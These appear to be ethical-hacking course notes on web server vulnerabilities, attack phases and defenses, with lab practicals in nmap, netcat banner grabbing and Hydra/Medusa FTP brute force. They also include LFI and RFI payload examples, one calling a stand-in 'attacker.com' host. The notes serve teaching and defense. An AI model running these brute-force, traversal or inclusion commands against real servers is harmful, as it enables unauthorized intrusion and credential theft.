# Web Server Hacking & Security — Complete Notes

## https://youtu.be/j6rFnQqiTvs

**Course:** Ethical Hacking / Cyber Security
**Type:** Theory + Practical Lab
**Instructor reference:** New Version Hacker

> **Disclaimer:** All techniques covered here are strictly for **educational purposes** — to build defensive awareness and ethical cyber security skills. Performing any of these techniques on systems/servers **without explicit written permission** is illegal under **IT Act 2000, Section 66** (up to 3 years imprisonment and/or ₹5 lakh fine). Always work ethically with authorized targets only.

---

## Table of Contents

1. [What Is a Web Server?](#1-what-is-a-web-server)
2. [Web Server vs. Web Application (Key Distinction)](#2-web-server-vs-web-application-key-distinction)
3. [Six Common Web Server Vulnerabilities](#3-six-common-web-server-vulnerabilities)
4. [Web Server Attack Method — 5-Step Process](#4-web-server-attack-method--5-step-process)
5. [Common Web Server Attacks](#5-common-web-server-attacks)
6. [Web Server Counter Measures (Defense)](#6-web-server-counter-measures-defense)
7. [Web Server Security Tools](#7-web-server-security-tools)
8. [RFI vs. LFI — Clarification](#8-rfi-vs-lfi--clarification)
9. [Practical Lab: Step-by-Step Demonstrations](#9-practical-lab-step-by-step-demonstrations)
10. [Tools Reference Summary](#10-tools-reference-summary)
11. [Key Takeaways](#11-key-takeaways)

---

## 1. What Is a Web Server?

**Definition:** A web server is a type of server (a large computer/software system) that **delivers web pages to users on their request**. When a user searches for or visits a website, a request is sent to the web server, which processes it and delivers (responds with) the appropriate web page.

**How the request-response cycle works:**

```
User (Browser) → Sends request (e.g., "I want the login page")
        ↓
Web Server → Processes the request
        ↓
Web Server → Delivers the requested page back to the user
        ↓
User (Browser) → Sees the page
```

**Why web servers matter for security:**

- Web servers are a **vital part of any organization's IT infrastructure** — all websites and most online services are hosted on them.
- If a web server is **compromised**, attackers gain control over the website, can **alter or steal data**, or perform other malicious activities.
- Even a **single small vulnerability** in a web server can lead to a major security breach — attackers only need one exploitable flaw to compromise an entire system.

**Common web server software:**

- **Apache** — widely used on Linux
- **Nginx (NGNX)** — widely used on Linux
- **IIS (Internet Information Services)** — Microsoft's web server, used on Windows

---

## 2. Web Server vs. Web Application (Key Distinction)

These two terms are related but different — understanding the distinction is important for forensics and ethical hacking work:

| Aspect           | Web Server                                                                   | Web Application                                                                                   |
| ---------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| **What it is**   | The hardware/software **infrastructure** that hosts and delivers web content | **Software installed on the server** that provides interactive functionality                      |
| **What it does** | Stores and delivers pages/files in response to requests                      | Allows users to interact with data, upload content, make transactions, etc.                       |
| **User role**    | User can only **view** what the server delivers                              | User can **interact** (e.g., post content, submit forms, make changes) as permitted by their role |
| **Example**      | `www.newversionhacker.com` (the hosting infrastructure)                      | YouTube, Facebook, Gmail (interactive applications running on servers)                            |

> **Practical note:** The courses visible on `newversionhacker.com` are there because the instructor created them — a visiting user can only _view_ what's there, not make design changes. This is the web server's delivery function. In a web _application_, authorized users can also create and modify content within defined permissions.

---

## 3. Six Common Web Server Vulnerabilities

### 3.1 Improper Authentication & Weak Passwords

**What it is:** Accounts with easily guessable or common passwords, and/or insufficient authentication mechanisms.

**Common weak password patterns:**

- Sequential numbers (e.g., `1234`, `123456`)
- Date of birth combinations
- `name.number` patterns
- Default credentials left unchanged (e.g., `admin`/`admin`)

**Why it matters:** Common/weak passwords are easily cracked via **dictionary attacks** or **brute force** — an attacker may not even need sophisticated tools if the password is common enough.

**Solution:**

- Enforce **strong password policies** (minimum length, complexity requirements).
- Implement **Multi-Factor Authentication (MFA)** or **Two-Factor Authentication (2FA)** — use an authenticator app (e.g., Google Authenticator).
- Three-factor authentication is also available for high-security scenarios.

---

### 3.2 Unnecessary Backup and Sample Files

**What it is:** Old backup files, test scripts, or previous versions of the website left accessible on the server.

**Why it matters:**

- Backup files are a **first priority target** for attackers — they reveal what the site used to look like and what security changes have been made since.
- Old backups can expose **past vulnerabilities** that were present before recent security patches — attackers compare old and new versions to find what was fixed and how.
- Backup files may contain **sensitive data** (old configuration files, plaintext credentials, database dumps).

**Solution:**

- **Delete unnecessary/old files** from the server immediately when they are no longer needed.
- Implement **proper access control** — restrict who can access what, so sensitive backup files are not publicly accessible even if they exist on the server.

---

### 3.3 Misconfigured Web Server, OS, or Network

**What it is:** The web server, operating system, or network has not been properly configured according to security best practices — leaving default settings in place or enabling features that shouldn't be on.

**Examples of misconfiguration:**

- Default credentials not changed.
- Unnecessary services/ports left enabled.
- Debug mode enabled in production.
- Overly permissive network rules.

**Why it matters:** Even a strong server can be compromised if it's not properly set up — attackers actively scan for misconfigured services.

**Solution:**

- Follow the **hardening guide** for your server/OS at installation (both Windows and Linux show security checklists during setup or in built-in security tools like Windows Defender).
- Conduct **regular security audits** to catch and fix misconfigurations — schedule these routinely (e.g., weekly, monthly) rather than waiting for an incident.
- Always **apply patches and security updates** promptly — an unpatched known vulnerability is an open invitation.

---

### 3.4 Unpatched Software and Missing Security Updates

**What it is:** Running outdated versions of web server software, plugins, frameworks, or OS without applying available security patches.

**Why it matters:** Security researchers and attackers alike study changelogs between old and new software versions — if an update fixes a security flaw, attackers know exactly what was vulnerable in the older version and will target servers still running it.

**Solution:**

- Always **run the latest stable versions** of all server software.
- Apply **security patches immediately** upon release.
- Monitor vendor security advisories for critical vulnerabilities.

---

### 3.5 Weak SSL/TLS Configuration (Weak Encryption)

**What it is:** The server's **SSL/TLS configuration** (Secure Socket Layer / Transport Layer Security) is improperly set up — using weak cipher suites, outdated SSL versions, or self-signed certificates without proper validation.

**Why SSL/TLS matters:**

- SSL/TLS is what creates **HTTPS** — the "S" in `HTTPS` stands for the SSL/TLS encryption layer.
- All web applications should use **HTTPS** (not plain HTTP) for all communication.
- If SSL is weak or misconfigured, attackers can **decrypt the encrypted traffic**, exposing usernames, passwords, session tokens, and other sensitive data transmitted between user and server.

**Solution:**

- Use **current, properly configured SSL/TLS certificates** (ideally from a trusted Certificate Authority, not self-signed).
- Use **strong cipher suites** and disable outdated SSL/TLS versions (e.g., SSL 2.0, SSL 3.0, TLS 1.0 are all deprecated).
- Regularly audit your SSL/TLS configuration (tools like SSL Labs' SSL Test can help).

---

### 3.6 Excessive Privileges / Violation of Least Privilege Principle

**What it is:** Users, processes, or services are granted **more permissions than they actually need** to perform their function.

**Example:** A Windows Update process being given full administrator access — when it only needs permissions to update system files.

**Why it matters:** Over-privileged processes or user accounts can be exploited by attackers to escalate privileges and gain broader control of the server. If a low-level process with admin rights is compromised, the attacker immediately has admin-level access to the entire system.

**Solution:**

- Follow the **Principle of Least Privilege (PoLP)** — give every user, process, and service the **minimum permissions required** to do their job, and nothing more.
- Regularly **audit user and process permissions** to identify and remove excessive access.
- Keep the **admin panel restricted** so that only administrators can access administrative functions — regular users should never see or reach the admin area.

---

## 4. Web Server Attack Method — 5-Step Process

Every systematic web server attack follows a structured sequence. Understanding this process is essential both for ethical testing and for building defenses.

### Step 1: Information Gathering (Footprinting & Reconnaissance)

**Goal:** Collect as much intelligence as possible about the target web server before attempting any exploit.

**What attackers seek to learn:**

- Which **technology/framework** is being used (PHP, ASP.NET, Python, etc.).
- Which **web server software** and **version** is running (Apache, IIS, Nginx — and their versions).
- Which **operating system** the server runs.
- Which **services and ports** are active.
- Any visible **version numbers** (outdated versions = known vulnerabilities).

**Tools used:**

| Tool            | Purpose                                                                                     |
| --------------- | ------------------------------------------------------------------------------------------- |
| **Whois**       | Domain registration and ownership information                                               |
| **Netcraft**    | Website fingerprinting — identifies hosting, server type, technology history                |
| **Dirb**        | Directory brute-forcing — finds hidden folders on the server                                |
| **Gobuster**    | Directory/file brute-forcing using word lists                                               |
| **Nmap**        | Network and port scanning; OS/service/version fingerprinting                                |
| **Netcat (nc)** | Versatile networking tool; used for banner grabbing, scripting, debugging, and exploitation |
| **Telnet**      | Active banner grabbing — retrieves server version/technology info by directly connecting    |

---

### Step 2: Vulnerability Identification

**Goal:** Identify specific security flaws in the discovered services, software versions, and configuration.

**What is checked:**

- Misconfigurations.
- Outdated software with known CVEs (Common Vulnerabilities and Exposures).
- Open ports that shouldn't be accessible.
- Weak authentication setups.

**Tools used:**

| Tool                                               | Purpose                             |
| -------------------------------------------------- | ----------------------------------- |
| **Nessus**                                         | Comprehensive vulnerability scanner |
| **OpenVAS (Open Vulnerability Assessment System)** | Open-source vulnerability scanning  |

---

### Step 3: Exploitation

**Goal:** Use identified vulnerabilities to compromise the web server.

**Common exploitation techniques:**

- **SQL Injection** — manipulating database queries.
- **Directory Traversal** — accessing restricted files.
- **File Inclusion** (LFI/RFI) — loading malicious files.
- **Remote Code Execution (RCE)** — executing arbitrary code on the server.

**Tools used:**

| Tool                            | Purpose                                                               |
| ------------------------------- | --------------------------------------------------------------------- |
| **Metasploit (Metasploitable)** | Industry-standard exploitation framework                              |
| **Burp Suite**                  | Web proxy for intercepting and modifying requests during exploitation |

---

### Step 4: Maintaining Access

**Goal:** After successfully compromising a server, ensure **persistent long-term access** — so that a restart or patch doesn't cut off the attacker's control.

**Methods used:**

- Installing a **backdoor** — a malicious program that runs quietly in the background and maintains a persistent connection or access channel.
- Deploying a **web shell** — a script uploaded to the server that provides remote command execution through a browser.

**Tools used:**

| Tool                  | Purpose                                                         |
| --------------------- | --------------------------------------------------------------- |
| **Weevely**           | PHP-based web shell for persistent access                       |
| **China Chopper**     | Compact web shell widely used for maintaining access            |
| **Web Shell scripts** | Custom or ready-made server-side scripts granting remote access |

---

### Step 5: Clearing Tracks (Covering Tracks)

**Goal:** Delete evidence of the attack — logs, access records, and activity traces — to **avoid detection and forensic identification**.

**Methods used:**

- Deleting or modifying **system logs**.
- Removing **evidence of uploaded tools**.
- Manipulating **timestamps** on files.

> **Forensic note:** This is precisely why digital forensics is valuable — forensic investigators have specialized techniques to **recover deleted logs and trace activity** even after attackers attempt to cover their tracks. No attack leaves zero evidence; some trace almost always remains.

---

## 5. Common Web Server Attacks

### 5.1 SQL Injection (SQLi)

**What:** Injecting malicious SQL queries into input fields to **manipulate the database** — bypassing authentication, leaking data, or modifying records.

**Impact:** Unauthorized database access; login bypass; data theft or modification.

**Tools:** SQLMap, Burp Suite.

---

### 5.2 Directory Traversal

**What:** Exploiting insufficient file path validation to **navigate outside the intended directory** and access restricted files (e.g., system configuration files, `/etc/passwd`, admin pages).

**Mechanism:** Uses sequences like `../` (dot-dot-slash) to move up one directory at a time, reaching files that should be inaccessible.

**Impact:** Exposure of sensitive files/data that should be restricted.

**Tools:** Dirb, Gobuster.

---

### 5.3 Remote Code Execution (RCE)

**What:** Injecting malicious code that executes **on the server remotely**, giving the attacker **full control** of the system.

**Impact:** Complete server compromise — the attacker can run any command, install software, exfiltrate data, or use the server as a launchpad for further attacks.

**Tools:** Metasploit, Web Shell scripts.

---

### 5.4 HTTP Response Splitting

**What:** Injecting **malicious HTTP headers** into a server response by exploiting insufficient header validation. The injected content "splits" the response and can introduce attacker-controlled content.

**Impact:** Can lead to cache poisoning, cross-site scripting, or session hijacking.

**Tools:** Custom scripts.

---

### 5.5 Web Cache Poisoning

**What:** Manipulating cached web content on the server (or an intermediary cache) to **serve malicious responses** to other users who request the same cached resource.

**Impact:** Malaysian content appears on the server's responses; potential for widespread XSS or credential theft affecting multiple users without direct interaction.

**Tools:** Custom scripts.

---

### 5.6 Cross-Site Scripting (XSS)

**What:** Injecting **malicious client-side scripts** into the web server's content that then execute in other users' browsers. (Covered in depth in the Web Application Security module.)

**Impact:** Session hijacking, credential theft, phishing via the compromised server.

---

### 5.7 Directory/Index Page Exposure (Google Dorking)

**What:** When a web server is configured to display **directory listings** (index pages of file folders) rather than a proper webpage, all files in that directory become visible and accessible.

**How found:** Attackers use search engine queries (**Google Dorking**) with operators like `intitle:"Index of"` to find servers exposing directory listings.

**Impact:** Exposes sensitive files, source code, configuration files, and backup files to anyone who finds them.

---

## 6. Web Server Counter Measures (Defense)

| Defense Measure                             | Description                                                                                                                            |
| ------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **Strong Passwords + MFA**                  | Enforce strong password policies; implement Multi-Factor Authentication; add CAPTCHA to login forms to prevent automated brute force   |
| **Keep Software Updated**                   | Always run the latest versions of web server software, plugins, and OS; apply security patches immediately upon release                |
| **Proper Access Control + Least Privilege** | Give every user and process only the minimum permissions they need; restrict admin panel access to administrators only                 |
| **Secure Configuration (Hardening)**        | Apply secure configuration at installation; disable unnecessary services, ports, and features; follow server hardening guides          |
| **Correct SSL/TLS Configuration**           | Use valid, trusted SSL certificates with strong cipher suites; ensure all communication goes through HTTPS                             |
| **Web Application Firewall (WAF)**          | Deploy a WAF to automatically filter and block SQL injection, XSS, LFI, RFI, and other common attacks at the network/application layer |
| **Regular Security Audits & Pen Testing**   | Schedule routine vulnerability scans using tools like Nessus/OpenVAS; commission ethical hackers or participate in Bug Bounty programs |
| **Delete Unnecessary Files**                | Remove all backup files, test scripts, sample files, and old versions from the server                                                  |
| **Custom Error Messages**                   | Show generic error pages to users — never expose server paths, technology details, or stack traces in error responses                  |
| **Disable Directory Listing**               | Configure the server to never expose directory contents — return a proper 403 or redirect instead                                      |

### Recommended WAF Solutions

| WAF                   | Notes                                                |
| --------------------- | ---------------------------------------------------- |
| **ModSecurity**       | Open-source, widely used WAF module for Apache/Nginx |
| **Cloudflare**        | Cloud-based WAF + DDoS protection service            |
| **AWS WAF / Imperva** | Enterprise-grade options                             |

> **WAF protects against:** SQL injection, XSS, LFI (Local File Inclusion), RFI (Remote File Inclusion), and many other OWASP Top 10 attack vectors.

---

## 7. Web Server Security Tools

### Scanning / Vulnerability Assessment

| Tool        | Purpose                                                                                       |
| ----------- | --------------------------------------------------------------------------------------------- |
| **Nessus**  | Comprehensive commercial vulnerability scanner                                                |
| **OpenVAS** | Open-source alternative to Nessus for vulnerability scanning                                  |
| **Nmap**    | Network/port scanning; service version detection; OS fingerprinting; script-based enumeration |

### Penetration Testing

| Tool                            | Purpose                                                               |
| ------------------------------- | --------------------------------------------------------------------- |
| **Metasploit (Metasploitable)** | Exploitation framework — used to test and demonstrate exploit impacts |
| **Burp Suite**                  | HTTP proxy + web application security testing suite                   |

### Firewalls / Protection

| Tool            | Purpose                                      |
| --------------- | -------------------------------------------- |
| **ModSecurity** | Open-source WAF module                       |
| **Cloudflare**  | Cloud-based WAF and CDN with DDoS protection |

---

## 8. RFI vs. LFI — Clarification

These two attack types are often confused. Both are **file inclusion vulnerabilities** — flaws that allow an attacker to include (load and execute) a file as part of the web server's response — but they differ in the source of the file:

| Aspect          | LFI (Local File Inclusion)                                                                | RFI (Remote File Inclusion)                                                                    |
| --------------- | ----------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| **Full form**   | Local File Inclusion                                                                      | Remote File Inclusion                                                                          |
| **File source** | A file **already present on the server** (local)                                          | An **external file** hosted on the attacker's machine or a remote URL                          |
| **Mechanism**   | Attacker manipulates input to load a local server file (e.g., `/etc/passwd`, log files)   | Attacker injects a URL pointing to a remote malicious file; the server fetches and executes it |
| **Impact**      | Read sensitive local files; may escalate to code execution if writable files are involved | Direct code execution — attacker's malicious script runs on the server                         |
| **Example**     | `?page=../../../etc/passwd`                                                               | `?page=http://attacker.com/malicious.php`                                                      |

**WAF protection:** A properly configured Web Application Firewall detects and blocks both LFI and RFI attempts.

---

## 9. Practical Lab: Step-by-Step Demonstrations

> **Lab Environment:**
>
> - **Attacker machine:** ParrotOS + Kali Linux
> - **Target machines:** Windows Server 2022, Windows Server 2019, Windows 10, Windows 11 (in a controlled local virtual network — `10.10.10.x` subnet)
> - **Test website:** `www.gomovie.com` / `www.goshopping.com` (personal test domains hosted on the lab servers)
>
> You need: one attacker machine (Kali/Parrot), one or more victim machines (Windows 10/11 and/or a Windows Server), all on the same virtual network.

---

### Practical 1: Banner Grabbing with Netcat

**Goal:** Extract web server version and technology information by directly querying the server.

**About Netcat:** A versatile networking tool that enables raw TCP/UDP connections. It is used for debugging, scripting, exploitation, and banner grabbing via TCP/IP. Also known as the "Swiss army knife" of networking tools.

**Step 1 — Connect to the web server:**

```bash
nc -vv www.gomovie.com 80
```

**Flag breakdown:**
| Flag | Meaning |
|---|---|
| `-vv` | Very verbose — shows detailed connection information |
| `80` | Port 80 — the default HTTP port for all web servers |

**Step 2 — Send an HTTP GET request after connecting:**

```
GET / HTTP/1.0

```

_(Press Enter twice)_

**What this reveals:**

- **Server software and version** (e.g., `Server: Microsoft-IIS/10.0`).
- **Last-Modified date** — when the page content was last changed.
- **Accept-Ranges** — supported byte ranges.
- **ETag** — cache validation token (used for verifying cache integrity).
- **Content-Type** and **Content-Length** — type and size of the response body.
- **Connection status** — whether the connection is persistent or closes after this response.
- **Full HTML source code** of the returned page (the server's response body).

> **Why port 80?** Port 80 is the universally standard port for HTTP communication. All web servers listen on port 80 by default for plain HTTP traffic; HTTPS uses port 443.

---

### Practical 2: Banner Grabbing with Telnet

**Goal:** Same as Netcat — identify server technology by directly querying it — using a different tool for comparison.

**About Telnet:** A network protocol and command-line tool that establishes a direct connection to remote systems. Commonly used for server administration (historically) and for diagnostic/information-gathering purposes in security work.

**Step 1 — Connect:**

```bash
telnet www.gomovie.com 80
```

**Step 2 — Send GET request:**

```
GET / HTTP/1.0

```

_(Press Enter twice)_

**Output:** Same type of information as Netcat — server version, dates, headers, HTML source.

> Both Netcat and Telnet can be used interchangeably for this task; the instructor demonstrates both to show that multiple tools produce the same outcome and familiarize learners with the available options.

---

### Practical 3: Service & Version Enumeration with Nmap Scripts

**Goal:** Use Nmap's built-in scripting engine to enumerate HTTP services and enumerate directories on the target server.

**Command 1 — HTTP enumeration script:**

```bash
nmap -sV --script http-enum www.gomovie.com
```

**Flag breakdown:**
| Flag | Meaning |
|---|---|
| `-sV` | Service and version scanning — detects software names and versions running on open ports |
| `--script http-enum` | Runs the built-in Nmap HTTP enumeration script — discovers directories and files on the web server |

**What this reveals:**

- All **open ports** and their services.
- **Software names and version numbers** per service.
- Specific **accessible directories** on the web server (e.g., `/admin/` was discovered in the demo).

---

**Command 2 — HTTP TRACE method detection:**

```bash
nmap -sV --script http-trace www.gomovie.com
```

**About HTTP TRACE:** TRACE is an HTTP method used to trace/debug the path of a request through the server. If enabled, it can be exploited for **Cross-Site Tracing (XST)** attacks. It should generally be disabled on production servers.

**What this reveals:**

- Whether the TRACE method is enabled on the server.
- Any server-side reasoning/context for why services are open (region/reason info).
- SSL status and certificate details.

---

**Command 3 — OS/Service fingerprinting:**

```bash
nmap -A -T4 -v www.gomovie.com
```

(Covered in the Web Application Security module — produces comprehensive results including MAC address, OS detection, NetBIOS name, DNS name, SSL details, etc.)

> **TTL (Time to Live) as OS fingerprint:** Different operating systems use different default TTL values in their TCP responses. A TTL of **128** typically indicates **Windows**; a TTL of **64** typically indicates **Linux/Unix**. This allows OS identification even without explicit OS detection flags.

---

**Command 4 — Firewall detection:**

```bash
nmap -p 80 --script http-waf-detect www.goshopping.com
```

**What this reveals:** Whether a Web Application Firewall (WAF) is detected in front of the target server — useful both for attackers (to know defenses) and defenders (to verify their WAF is functioning and visible).

---

**Command 5 — Hostname/host-map enumeration (advanced):**

```bash
nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap-bfk www.goshopping.com
```

**Purpose:** Discovers all hostnames associated with the target's IP address — useful for finding additional subdomains or virtual hosts on the same server.

---

### Practical 4: FTP Brute Force with Hydra

**Goal:** Demonstrate a **dictionary/brute force attack** on an FTP (File Transfer Protocol) service to crack valid login credentials.

**Pre-requisites:**

- Confirm that port 21 (FTP) is open on the target (verified via Nmap scan — shown as open in the demo).
- Prepare two word list files: one for usernames, one for passwords.

**Word list structure (plain `.txt` files):**

```
# usernames.txt (example entries):
admin
administrator
martin
jason
shela

# password.txt (example entries):
password
Dr$DID
admin123
P@ssw0rd
```

**Hydra command:**

```bash
hydra -L /home/attacker/Downloads/usernames.txt -P /home/attacker/Downloads/password.txt ftp://10.10.10.10
```

**Flag breakdown:**
| Flag | Meaning |
|---|---|
| `-L` | Specifies the path to the **username word list** file (capital L = list file) |
| `-P` | Specifies the path to the **password word list** file (capital P = password list) |
| `ftp://[IP]` | Target protocol (`ftp://`) and target IP address |

**Interpreting results:**

- Lines marked with `+` or in **green** = **successful login found** (valid credentials).
- Lines in **red** = no match found for that combination.
- In the demo, the attack returned valid credentials including: `admin` and `martin` accounts.

---

**Alternative tool — Medusa (same function as Hydra):**

```bash
medusa -h 10.10.10.10 -U /path/to/usernames.txt -P /path/to/passwords.txt -M ftp
```

**Key flags:**
| Flag | Meaning |
|---|---|
| `-h` | Target host IP |
| `-U` | Username list file |
| `-P` | Password list file |
| `-M` | Protocol/module to attack (`ftp`) |

**Medusa results in demo:** Found additional valid accounts (`admin`, `johnson`, `martin`), with different results from Hydra due to different word lists being used.

> **Important lesson:** Different tools and different word lists can yield different results. In real investigations, **using multiple tools** increases the chance of finding all valid credentials. The quality of your word list also significantly affects results — a good word list based on information gathering (names found on the site, common corporate password patterns) is far more effective than a generic one.

---

### Practical 5: Logging In via FTP and Demonstrating Access

**Goal:** Use the credentials obtained in the brute force step to actually **log in to the FTP server** and demonstrate the level of access an attacker gains.

**Command:**

```bash
ftp 10.10.10.10
```

_(At the prompt, enter discovered username and password)_

**Useful FTP commands once logged in:**

| Command          | Function                                                             |
| ---------------- | -------------------------------------------------------------------- |
| `help`           | Lists all available FTP commands                                     |
| `pwd`            | Prints current working directory (shows where you are on the server) |
| `ls`             | Lists files and directories in the current location                  |
| `mkdir [name]`   | Creates a new directory on the remote server                         |
| `get [filename]` | Downloads a file from the server to the attacker's machine           |
| `put [filename]` | Uploads a file from the attacker's machine to the server             |

**Demonstrated in the lab:**

- After logging in, the instructor ran `mkdir Hack` on one target and `mkdir NVH_Lab` on another.
- Both new directories were immediately **visible on the victim machines** — proving that an attacker with FTP access can **write files/directories directly onto the server**.
- This level of access enables an attacker to upload web shells, malware, backdoors, or any other malicious files onto the server.

> **Why FTP is dangerous without security controls:** FTP credentials travel **in plaintext** (unencrypted) unless SFTP/FTPS is used — meaning anyone intercepting the network traffic can read the username and password directly. FTP also grants file system access on the server, making it a high-value target for attackers.

---

### Practical 6: Directory Enumeration (Additional Demonstration)

After information gathering, directories were also enumerated using the tools covered in the Web Application Security module. Key tools used in this module's lab:

**Dirb (with word list):**

```bash
dirb http://www.gomovie.com /usr/share/wordlists/dirb/common.txt
```

**Gobuster:**

```bash
gobuster dir -u http://www.gomovie.com -w /path/to/wordlist.txt
```

Both tools systematically discover hidden directories and files on the web server that are not linked from the main pages — valuable for finding admin panels, configuration files, or old backup directories.

---

## 10. Tools Reference Summary

| Tool              | Category                 | Key Use                                                       |
| ----------------- | ------------------------ | ------------------------------------------------------------- |
| **Netcat (nc)**   | Recon / Exploitation     | Banner grabbing, raw TCP connections, scripting, exploitation |
| **Telnet**        | Recon                    | Banner grabbing, remote connection to services                |
| **Nmap**          | Recon / Scanning         | Port scanning, OS detection, version scanning, HTTP scripting |
| **Whois**         | Recon                    | Domain ownership and registration information                 |
| **Netcraft**      | Recon                    | Technology fingerprinting and hosting history                 |
| **Dirb**          | Recon                    | Directory brute-forcing with word lists                       |
| **Gobuster**      | Recon                    | Directory/file brute-forcing with word lists                  |
| **Nessus**        | Vulnerability Assessment | Comprehensive vulnerability scanning                          |
| **OpenVAS**       | Vulnerability Assessment | Open-source vulnerability scanning                            |
| **Hydra**         | Exploitation             | Multi-protocol brute force (FTP, SSH, HTTP, etc.)             |
| **Medusa**        | Exploitation             | Multi-protocol brute force (alternative to Hydra)             |
| **Metasploit**    | Exploitation             | Multi-purpose exploitation framework                          |
| **Burp Suite**    | Exploitation / Testing   | HTTP proxy for web request interception and manipulation      |
| **Weevely**       | Persistence              | PHP web shell for maintaining access                          |
| **China Chopper** | Persistence              | Compact web shell for persistent server access                |
| **ModSecurity**   | Defense                  | Open-source Web Application Firewall                          |
| **Cloudflare**    | Defense                  | Cloud-based WAF + DDoS protection                             |

---

## 11. Key Takeaways

1. **Web servers are the backbone of all web-hosted services** — every website, web application, and online platform depends on a web server. Compromising one can give an attacker control over everything hosted on it.

2. **The six most common web server vulnerabilities are well-known and preventable:** weak passwords/authentication, old backup files, misconfiguration, unpatched software, weak SSL/TLS, and excessive privileges — all have clear, implementable defenses.

3. **The attack process follows a structured 5-step method:** Information Gathering → Vulnerability Identification → Exploitation → Maintaining Access → Covering Tracks. Understanding this process is essential for both offensive testing and building effective defenses.

4. **Banner grabbing (Netcat, Telnet) is the simplest form of information gathering** — just connecting to a server and sending a GET request reveals the server software, version, technology stack, and more. This is why security professionals recommend **suppressing or genericizing server banners** on production systems.

5. **Nmap with its script engine is extremely powerful** for web server reconnaissance — a single `-A` flag or `--script` argument can reveal OS, services, versions, directories, firewall presence, and vulnerability hints simultaneously.

6. **Brute force attacks on exposed services (FTP, SSH, HTTP login) are highly effective** when weak passwords are used — tools like Hydra and Medusa can test thousands of credential combinations automatically. Using strong passwords, MFA, and account lockout policies is essential.

7. **FTP without encryption is particularly dangerous** — it transmits credentials in plaintext and grants direct file system access on the server. Prefer SFTP or FTPS; disable plain FTP wherever possible.

8. **LFI and RFI are distinct attack types:** LFI loads files already on the server; RFI loads attacker-controlled remote files and executes them — both require strict input validation and WAF protection.

9. **Digital forensics and web server security are complementary:** Attackers clear their tracks (delete logs) specifically to evade forensic investigation — but forensic techniques can often recover deleted logs and traces, reinforcing why both disciplines matter.

10. **A Web Application Firewall (WAF) is a critical layer of defense** — it automatically filters SQL injection, XSS, LFI, RFI, and other common attacks at the network/application boundary, providing protection even if underlying code has vulnerabilities.

---

_These notes cover web server security as a module within the ethical hacking curriculum. They complement both the Web Application Security notes (which cover the application layer above the server) and the Digital Forensics notes (which cover investigation of compromised systems after the fact)._
